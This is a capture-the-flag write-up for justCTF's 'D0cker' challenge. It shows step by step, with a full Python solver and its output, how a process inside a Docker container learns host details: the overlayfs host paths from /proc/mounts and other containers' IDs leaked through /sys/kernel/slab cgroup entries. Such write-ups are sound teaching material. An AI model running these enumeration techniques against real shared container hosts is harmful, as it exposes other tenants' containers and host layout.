# D0cker

In this challenge, we connect to a server which spawns us a Docker container.
On the filesystem, there is an `oracle.sock` with which we have to communicate
and we have to find answers to its questions.

```  
➜  pwn_docker git:(master) nc docker-ams32.nc.jctf.pro 1337

Access to this challenge is rate limited via hashcash!  
Please use the following command to solve the Proof of Work:  
hashcash -mb26 srstylyd

Your PoW: 1:26:210131:srstylyd::j48cYbN3LycmgT9f:000000004U6N/  
1:26:210131:srstylyd::j48cYbN3LycmgT9f:000000004U6N/  
[*] Spawning a task manager for you...  
[*] Spawning a Docker container with a shell for ya, with a timeout of 10m :)  
[*] Your task is to communicate with /oracle.sock and find out the answers for
its questions!  
[*] You can use this command for that:  
[*]   socat - UNIX-CONNECT:/oracle.sock  
[*] PS: If the socket dies for some reason (you cannot connect to it) just
exit and get into another instance

groups: cannot find name for group ID 1000

I have no name!@694ff9e7ac41:/$ ls -la /  
ls -la /  
total 56  
drwxr-xr-x   1 root root 4096 Jan 31 18:37 .  
drwxr-xr-x   1 root root 4096 Jan 31 18:37 ..  
-rwxr-xr-x   1 root root    0 Jan 31 18:37 .dockerenv  
lrwxrwxrwx   1 root root    7 Jan 19 01:01 bin -> usr/bin  
drwxr-xr-x   2 root root 4096 Apr 15  2020 boot  
drwxr-xr-x   5 root root  360 Jan 31 18:37 dev  
drwxr-xr-x   1 root root 4096 Jan 31 18:37 etc  
drwxr-xr-x   2 root root 4096 Apr 15  2020 home  
lrwxrwxrwx   1 root root    7 Jan 19 01:01 lib -> usr/lib  
lrwxrwxrwx   1 root root    9 Jan 19 01:01 lib32 -> usr/lib32  
lrwxrwxrwx   1 root root    9 Jan 19 01:01 lib64 -> usr/lib64  
lrwxrwxrwx   1 root root   10 Jan 19 01:01 libx32 -> usr/libx32  
drwxr-xr-x   2 root root 4096 Jan 19 01:01 media  
drwxr-xr-x   2 root root 4096 Jan 19 01:01 mnt  
drwxr-xr-x   2 root root 4096 Jan 19 01:01 opt  
srwxrwxrwx   1 root root    0 Jan 31 18:37 oracle.sock  
dr-xr-xr-x 153 root root    0 Jan 31 18:37 proc  
drwx------   2 root root 4096 Jan 19 01:04 root  
drwxr-xr-x   1 root root 4096 Jan 21 03:38 run  
lrwxrwxrwx   1 root root    8 Jan 19 01:01 sbin -> usr/sbin  
drwxr-xr-x   2 root root 4096 Jan 19 01:01 srv  
dr-xr-xr-x  13 root root    0 Jan 31 18:37 sys  
drwxrwxrwt   1 root root 4096 Jan 30 20:11 tmp  
drwxr-xr-x   1 root root 4096 Jan 19 01:01 usr  
drwxr-xr-x   1 root root 4096 Jan 19 01:04 var

I have no name!@694ff9e7ac41:/$ mount | grep sock  
mount | grep sock  
/dev/vda1 on /oracle.sock type ext4 (rw,relatime)  
```

## Level 1  
We connect to the oracle as the challenge suggests, by using `socat - UNIX-
CONNECT:/oracle.sock`.  
Alternatively a `python3` script can be used (which is helpful later on) as
there is Python 3 interpreter in the container.

```  
I have no name!@694ff9e7ac41:/$ socat - UNIX-CONNECT:/oracle.sock  
socat - UNIX-CONNECT:/oracle.sock  
Welcome to the  
   ______ _____      _  
   |  _  \  _  |    | |  
   | | | | |/' | ___| | _____ _ __  
   | | | |  /| |/ __| |/ / _ \ '__|  
   | |/ /\ |_/ / (__|   <  __/ |  
   |___/  \___/ \___|_|\_\___|_|  
   oracle!  
I will give you the flag if you can tell me certain information about the host
(:  
ps: brute forcing is not the way to go.  
Let's go!  
[Level 1] What is the full *cpu model* model used?  
```

In the first level the oracle asks us about the *cpu model used*. We can find
this in the `/proc/cpuinfo` file:  
```  
I have no name!@8b6ad5efc924:/$ cat /proc/cpuinfo | grep -i model  
cat /proc/cpuinfo | grep -i model  
model           : 85  
model name      : Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
model           : 85  
model name      : Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
model           : 85  
model name      : Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
model           : 85  
model name      : Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
```

## Second level  
In the second level, thhe oracle asks about *our full container id*:  
```  
[Level 1] What is the full *cpu model* model used?  
Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
Intel(R) Xeon(R) Gold 6140 CPU @ 2.30GHz  
That was easy :)  
[Level 2] What is your *container id*?  
```

This can be found as part of the `/proc/self/cgroup` file:  
```  
I have no name!@8b6ad5efc924:/$ cat /proc/self/cgroup | head -n2  
cat /proc/self/cgroup  
12:cpuset:/docker/8b6ad5efc924c8bd3a09f8b75d0b67c157542e1a0c85db3b5f1ff271e9039259  
11:hugetlb:/docker/8b6ad5efc924c8bd3a09f8b75d0b67c157542e1a0c85db3b5f1ff271e9039259  
```

## Third level  
Now, the oracle says it creates a `/secret` file inside of our container and
wants us to read this value:

```  
[Level 2] What is your *container id*?  
8b6ad5efc924c8bd3a09f8b75d0b67c157542e1a0c85db3b5f1ff271e9039259  
8b6ad5efc924c8bd3a09f8b75d0b67c157542e1a0c85db3b5f1ff271e9039259  
[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?  
```

If we fail to answer, we can read this file:  
```  
[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?  
asd  
asd  
Meh, that is not the secret I wrote into your /secret path. Goodbye.  
I have no name!@8b6ad5efc924:/$ cat /secret  
cat /secret  
OBojABAvUcVCWcpOCgQwLtLxxmgUpQQFSQjjwDpTYVskjFvBAmLZjheaGPfWOGKOI have no
name!@8b6ad5efc924:/$  
```

However, this file is re-created every time we get to level 3 and so we need
to read it *at the same time as we talk to the oracle*.

I guess there are multiple ways to do this, but the easiest is probably to
write a Python script to do so (and save it in `/tmp` with `vim`, as it is
also in the container).

For this I have written the following code:

```py  
import sys  
import socket  
import time  
import subprocess

with open('/proc/self/cgroup') as f:  
   my_container_id = f.read().splitlines()[0].split('docker/')[1]

print("MY CONTAINER ID: %s" % my_container_id)

cpuinfo_lines = open('/proc/cpuinfo').read().splitlines()  
cpumodel_line = next(line for line in cpuinfo_lines if 'model name' in line)  
cpumodel = cpumodel_line.split(': ')[1].strip()

sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  
sock.connect('/oracle.sock')

print(sock.recv(864))  
sock.sendall((cpumodel + '\n').encode())  
print(sock.recv(len(b'That was easy :)\n[Level 2] What is your *container
id*?\n')))  
sock.sendall((my_container_id + '\n').encode())  
print(sock.recv(500))

time.sleep(1)  
with open('/secret') as f:  
   secret = f.read()  
print("READ SECRET: %s" % secret)  
sock.sendall((secret + '\n').encode())  
print(sock.recv(500))  
```

If we launch it, we get to level 4:  
```  
I have no name!@d1d8c566419a:/$ cd /tmp  
cd /tmp  
I have no name!@d1d8c566419a:/tmp$ vim a.py  
vim a.py  
I have no name!@d1d8c566419a:/tmp$ python3 a.py  
python3 a.py  
MY CONTAINER ID:
d1d8c566419a8c763c8515042d0d292907c4280e9d9c2c8e446fa92a4c444e0e  
b"Welcome to the\n    ______ _____      _             \n    |  _  \\  _  |    | |            \n    | | | | |/' | ___| | _____ _ __ \n    | | | |  /| |/ __| |/ / _ \\ '__|\n    | |/ /\\ |_/ / (__|   <  __/ |   \n    |___/  \\___/ \\___|_|\\_\\___|_|   \n    oracle!\nI will give you the flag if you can tell me certain information about the host (:\nps: brute forcing is not the way to go.\nLet's go!\n[Level 1] What is the full *cpu model* model used?\n"  
b'That was easy :)\n[Level 2] What is your *container id*?\n'  
b'[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?\n'  
READ SECRET: nuKJfSaqzyyIrxfpkwFfzYAQWwmljCXBNztXBdffZiPacXRVVIIAxGIxAwnlPFRX  
b'[Level 4] Okay but... where did I actually write it? What is the path on the
host that I wrote the /secret file to which then appeared in your container?
(ps: there are multiple paths which you should be able to figure out but I
only match one of them)\n'  
```

## Level 4

Now, we have to answer with a path the `/secret` file is visible on the host.
Interestingly, because of how overlayfs works, which is the filesystem used by
Docker in this challenge, the host path is present in the `/proc/mounts` file:  
```  
I have no name!@d1d8c566419a:/tmp$ cat /proc/mounts | head -n1  
cat /proc/mounts | head -n1  
overlay / overlay
rw,relatime,lowerdir=/var/lib/docker/overlay2/l/TNHN4TXZQR7PSITKI3EJKZ7SSE:/var/lib/docker/overlay2/l/JQG4DHIHDNUJUSNWI3BNOCS3GO:/var/lib/docker/overlay2/l/EPGEJI72R5AVERPF7MGK2ROUJ5:/var/lib/docker/overlay2/l/J3TTTPZ6J6HOAOEKZQQQII6SXE:/var/lib/docker/overlay2/l/BFOV7S6MFX4532OSVYTKYP37SP,upperdir=/var/lib/docker/overlay2/07bd747e7e08a4c28de6d20baa8236674f1a265d9640273447c23cd50f41150c/diff,workdir=/var/lib/docker/overlay2/07bd747e7e08a4c28de6d20baa8236674f1a265d9640273447c23cd50f41150c/work,xino=off
0 0  
```

The part that interests us is `upperdir` as this is the directory used for
files in the overlayfs layer we change files in. So the `/secret` path is
eventually
`/var/lib/docker/overlay2/07bd747e7e08a4c28de6d20baa8236674f1a265d9640273447c23cd50f41150c/diff/secret`.

We can extend our Python script with this:  
```  
with open('/proc/self/mounts') as f:  
   mounts = f.read().splitlines()  
   upperdir = [i for i in mounts if 'upperdir=' in i][0]  
   upperdir = upperdir[upperdir.index('upperdir=')+len('upperdir='):]  
   upperdir = upperdir.split(',')[0]

path = upperdir+'/secret'  
print("PATH IS: %s" % path)

sock.sendall((path + '\n').encode())  
print(sock.recv(500))  
```

Then, we will get:  
```  
I have no name!@d1d8c566419a:/tmp$ python3 a.py  
python3 a.py  
MY CONTAINER ID:
d1d8c566419a8c763c8515042d0d292907c4280e9d9c2c8e446fa92a4c444e0e  
b"Welcome to the\n    ______ _____      _             \n    |  _  \\  _  |    | |            \n    | | | | |/' | ___| | _____ _ __ \n    | | | |  /| |/ __| |/ / _ \\ '__|\n    | |/ /\\ |_/ / (__|   <  __/ |   \n    |___/  \\___/ \\___|_|\\_\\___|_|   \n    oracle!\nI will give you the flag if you can tell me certain information about the host (:\nps: brute forcing is not the way to go.\nLet's go!\n[Level 1] What is the full *cpu model* model used?\n"  
b'That was easy :)\n[Level 2] What is your *container id*?\n'  
b'[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?\n'  
READ SECRET: SwKrVgQpsxiumerauAJeGlAGYfKOINwLRDkoPYvWnpnQGRlEYQdYprOpWMUwjsrM  
b'[Level 4] Okay but... where did I actually write it? What is the path on the
host that I wrote the /secret file to which then appeared in your container?
(ps: there are multiple paths which you should be able to figure out but I
only match one of them)\n'  
PATH IS:
/var/lib/docker/overlay2/07bd747e7e08a4c28de6d20baa8236674f1a265d9640273447c23cd50f41150c/diff/secret  
b'[Level 5] Good! Now, can you give me an id of any *other* running
container?\n'  
```

## Level 5

In level 5 we have to find out an id of another container. This can be given
e.g. by running another container, but, the reality is that other container
ids can be found in `/sys` (or sysfs) paths, due to cgroups debug
configuration present in this kernel.

Actually, I believe this is a bug and I reported it to Docker, but they did
not fix it (yet?). More information can be found in this presentation:
https://docs.google.com/presentation/d/1VpXqzPIPrfIPSIiua5ClNkjKAzM3uKlyAKUf0jBqoUI/

## Level 6

In level 6, we are asked about the oracle container id. For this, one can find
ALL container ids using the previous technique and then try each of them.

A full solver script and its output can be seen below:  
```  
import sys  
import socket  
import time  
import subprocess  
import re

CONTAINER_ID_REGEX = '[a-z0-9]{64}'

with open('/proc/self/cgroup') as f:  
   my_container_id = f.read().splitlines()[0].split('docker/')[1]

print("MY CONTAINER ID: %s" % my_container_id)

cpuinfo_lines = open('/proc/cpuinfo').read().splitlines()  
cpumodel_line = next(line for line in cpuinfo_lines if 'model name' in line)  
cpumodel = cpumodel_line.split(': ')[1].strip()

def get_container_ids():  
   data = subprocess.check_output('ls -l /sys/kernel/slab/*/cgroup/',
shell=True).decode().splitlines()  
   cgroups = set(line.split('(')[-1][:-1].split(':')[1] for line in data if
'(' in line and line[-1] == ')')  
   return cgroups

def filter_container_ids(iterable):  
   return [  
       i for i in iterable if re.match(CONTAINER_ID_REGEX, i)  
   ]

all_container_ids = filter_container_ids(get_container_ids())

def attempt(target_id):  
   sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)  
   sock.connect('/oracle.sock')

   print(sock.recv(864))  
   sock.sendall((cpumodel + '\n').encode())  
   print(sock.recv(len(b'That was easy :)\n[Level 2] What is your *container
id*?\n')))  
   sock.sendall((my_container_id + '\n').encode())  
   print(sock.recv(500))

   time.sleep(1)  
   with open('/secret') as f:  
       secret = f.read()  
   print("READ SECRET: %s" % secret)  
   sock.sendall((secret + '\n').encode())  
   print(sock.recv(500))

   with open('/proc/self/mounts') as f:  
       mounts = f.read().splitlines()  
       upperdir = [i for i in mounts if 'upperdir=' in i][0]  
       upperdir = upperdir[upperdir.index('upperdir=')+len('upperdir='):]  
       upperdir = upperdir.split(',')[0]

   path = upperdir+'/secret'  
   print("PATH IS: %s" % path)

   sock.sendall((path + '\n').encode())  
   print(sock.recv(500))

   sock.sendall((target_id + '\n').encode())  
   print(sock.recv(500))  
   sock.sendall((target_id + '\n').encode())  
   flag = sock.recv(500)  
   if b'justCTF' in flag:  
       print(flag)  
       sys.exit(0)

for container_id in all_container_ids:  
   attempt(container_id)  
```  
  
  
Output:  
```  
➜  pwn_docker git:(master) nc docker-ams3.nc.jctf.pro 1337

Access to this challenge is rate limited via hashcash!  
Please use the following command to solve the Proof of Work:  
hashcash -mb26 qwfnelht

Your PoW: 1:26:210131:qwfnelht::h+td0j0UshHduXoB:000000002Mwjf  
1:26:210131:qwfnelht::h+td0j0UshHduXoB:000000002Mwjf  
[*] Spawning a task manager for you...  
[*] Spawning a Docker container with a shell for ya, with a timeout of 10m :)  
[*] Your task is to communicate with /oracle.sock and find out the answers for
its questions!  
[*] You can use this command for that:  
[*]   socat - UNIX-CONNECT:/oracle.sock  
[*] PS: If the socket dies for some reason (you cannot connect to it) just
exit and get into another instance

groups: cannot find name for group ID 1000  
I have no name!@4d461268ca63:/$ cd /tmp  
cd /tmp  
I have no name!@4d461268ca63:/tmp$ vim a.py  
vim a.py  
I have no name!@4d461268ca63:/tmp$ python3 a.py  
python3 a.py  
MY CONTAINER ID:
4d461268ca6389cb9819370e5d16cd0fbd90c7cfbbc5a6e61f2c08c0cf05d36e  
b"Welcome to the\n    ______ _____      _             \n    |  _  \\  _  |    | |            \n    | | | | |/' | ___| | _____ _ __ \n    | | | |  /| |/ __| |/ / _ \\ '__|\n    | |/ /\\ |_/ / (__|   <  __/ |   \n    |___/  \\___/ \\___|_|\\_\\___|_|   \n    oracle!\nI will give you the flag if you can tell me certain information about the host (:\nps: brute forcing is not the way to go.\nLet's go!\n[Level 1] What is the full *cpu model* model used?\n"  
b'That was easy :)\n[Level 2] What is your *container id*?\n'  
b'[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?\n'  
READ SECRET: VGWhBDKMnUAkibWVCIhLfBTEgHgCSnYFcXYlGrsJtloeVndueylkOOFTmaOWxpLZ  
b'[Level 4] Okay but... where did I actually write it? What is the path on the
host that I wrote the /secret file to which then appeared in your container?
(ps: there are multiple paths which you should be able to figure out but I
only match one of them)\n'  
PATH IS:
/var/lib/docker/overlay2/d21afca74baff438a964e910e351451fd3aa99448da2842def3f6dd9be415118/diff/secret  
b'[Level 5] Good! Now, can you give me an id of any *other* running
container?\n'  
b"[Level 6] Now, let's go with the real and final challenge. I, the Docker
Oracle, am also running in a container. What is my container id?\n"

# (...) - truncated many many lines here

b"Welcome to the\n    ______ _____      _             \n    |  _  \\  _  |    | |            \n    | | | | |/' | ___| | _____ _ __ \n    | | | |  /| |/ __| |/ / _ \\ '__|\n    | |/ /\\ |_/ / (__|   <  __/ |   \n    |___/  \\___/ \\___|_|\\_\\___|_|   \n    oracle!\nI will give you the flag if you can tell me certain information about the host (:\nps: brute forcing is not the way to go.\nLet's go!\n[Level 1] What is the full *cpu model* model used?\n"  
b'That was easy :)\n[Level 2] What is your *container id*?\n'  
b'[Level 3] Let me check if you truly given me your container id. I created a
/secret file on your machine. What is the hidden secret?\n'  
READ SECRET: xVYFjhtWEMLvAwqaJigvPdgUByAkLQKItUdURFGBXvtHbToyfPtrXKGOzHQycioP  
b'[Level 4] Okay but... where did I actually write it? What is the path on the
host that I wrote the /secret file to which then appeared in your container?
(ps: there are multiple paths which you should be able to figure out but I
only match one of them)\n'  
PATH IS:
/var/lib/docker/overlay2/d21afca74baff438a964e910e351451fd3aa99448da2842def3f6dd9be415118/diff/secret  
b'[Level 5] Good! Now, can you give me an id of any *other* running
container?\n'  
b"[Level 6] Now, let's go with the real and final challenge. I, the Docker
Oracle, am also running in a container. What is my container id?\n"  
b'[Levels cleared] Well done! Here is your flag!\njustCTF{maaybe-Docker-will-
finally-fix-this-after-this-task?}\n\nGood job o/\n'  
```

And the flag is `justCTF{maaybe-Docker-will-finally-fix-this-after-this-
task?}`.

Original writeup (https://hackmd.io/gE3lxzmBSqan7MieJ-kWww).